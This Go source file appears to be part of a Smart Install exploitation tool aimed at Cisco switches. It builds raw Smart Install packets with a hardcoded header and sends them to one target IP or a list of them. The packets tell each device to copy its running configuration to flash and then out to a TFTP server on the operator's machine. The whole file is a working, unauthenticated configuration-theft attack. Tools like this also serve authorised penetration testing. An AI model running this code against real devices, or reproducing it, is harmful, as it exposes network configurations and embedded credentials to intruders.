package libs

import (
	"encoding/hex"
	"fmt"
	"time"
)

// GetConfigMode handles the configuration retrieval functionality
func (s *SIETClient) GetConfigMode() {
	if s.Config.IPList != "" {
		s.processMultipleIPs(s.getConfigFromDevice)
	} else if s.Config.IP != "" {
		s.getConfigFromDevice(s.Config.IP)
	}
}

// getConfigFromDevice retrieves configuration from a single device
func (s *SIETClient) getConfigFromDevice(targetIP string) {
	myIP, err := s.GetLocalIP(targetIP)
	if err != nil {
		fmt.Printf("Error getting local IP: %v\n", err)
		return
	}

	// Use public IP if specified
	if s.Config.PublicIP != "" {
		myIP = s.Config.PublicIP
	}

	// Commands to copy config
	cmd1 := "copy system:running-config flash:/config.text"
	cmd2 := fmt.Sprintf("copy flash:/config.text tftp://%s/%s.conf", myIP, targetIP)
	
	packet := s.buildGetConfigPacket(cmd1, cmd2)
	
	err = s.SendPacketToDevice(targetIP, packet)
	if err != nil {
		fmt.Printf("Error sending packet to %s: %v\n", targetIP, err)
		return
	}

	fmt.Printf("[INFO]: Config retrieval packet sent to %s\n", targetIP)
	fmt.Printf("[INFO]: Waiting for TFTP transfer...\n")
	
	// Wait for file transfer
	time.Sleep(20 * time.Second)
}

// buildGetConfigPacket builds the Smart Install packet for configuration retrieval
func (s *SIETClient) buildGetConfigPacket(cmd1, cmd2 string) []byte {
	// Smart Install get config packet structure
	header := "000000010000000100000008000004080001001400000001000000000000fc99473786600000000303f4"
	
	headerBytes, _ := hex.DecodeString(header)
	
	// Pad commands to required lengths
	cmd1Padded := s.padCommand(cmd1, 336)
	cmd2Padded := s.padCommand(cmd2, 336)
	
	packet := append(headerBytes, cmd1Padded...)
	packet = append(packet, cmd2Padded...)
	
	return packet
}
